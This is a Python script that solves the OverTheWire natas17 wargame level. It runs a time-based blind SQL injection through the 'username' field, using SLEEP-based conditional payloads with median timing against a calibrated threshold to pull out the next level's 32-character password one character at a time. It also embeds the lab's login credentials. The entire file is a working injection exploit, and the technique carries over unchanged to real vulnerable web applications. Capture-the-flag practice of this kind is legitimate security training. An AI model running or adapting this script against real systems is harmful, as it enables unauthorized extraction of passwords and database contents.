#!/usr/bin/env python3
import time
import statistics
import string
import requests

URL = "http://natas17.natas.labs.overthewire.org/index.php"
AUTH = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")

PASSWORD_LEN = 32
CHARSET = string.ascii_letters + string.digits

SLEEP_TIME = 2  # shorter sleep = faster, but needs good thresholding
SAMPLES = 5     # median of 5 is pretty stable
TIMEOUT = 8

def timed_post(sess: requests.Session, username_payload: str) -> float:
    t0 = time.perf_counter()
    sess.post(URL, data={"username": username_payload}, timeout=TIMEOUT)
    return time.perf_counter() - t0

def median_time(sess: requests.Session, payload: str, samples: int) -> float:
    times = []
    for _ in range(samples):
        try:
            times.append(timed_post(sess, payload))
        except requests.RequestException:
            # Treat transient failure as "slow" to avoid crashing;
            # median will usually ignore a single bad sample.
            times.append(TIMEOUT)
    return statistics.median(times)

def calibrate_baseline(sess: requests.Session) -> float:
    # a payload that should NOT sleep
    payload = 'natas18" AND IF(1=0, SLEEP(2), 0)-- '
    med = median_time(sess, payload, samples=7)
    return med

def is_match(sess: requests.Session, pos: int, ch: str, threshold: float) -> bool:
    payload = f'natas18" AND IF(BINARY SUBSTRING(password,{pos},1)="{ch}", SLEEP({SLEEP_TIME}), 0)-- '
    med = median_time(sess, payload, samples=SAMPLES)
    return med > threshold

def extract():
    with requests.Session() as sess:
        sess.auth = AUTH
        sess.headers.update({"Connection": "keep-alive"})

        baseline = calibrate_baseline(sess)
        # Adaptive threshold: baseline + (sleep_time * 0.6) is a good starting point
        threshold = baseline + (SLEEP_TIME * 0.6)

        print(f"[*] Baseline median: {baseline:.3f}s")
        print(f"[*] Threshold:       {threshold:.3f}s (sleep={SLEEP_TIME}s, samples={SAMPLES})\n")

        pw = ""
        for pos in range(1, PASSWORD_LEN + 1):
            found = False
            for ch in CHARSET:
                if is_match(sess, pos, ch, threshold):
                    pw += ch
                    print(f"[+] {pos:02d}: {ch}   => {pw}")
                    found = True
                    break
            if not found:
                print(f"[!] No match at position {pos}. Stopping.")
                break

        print("\n[✓] Extracted:", pw)

if __name__ == "__main__":
    extract()
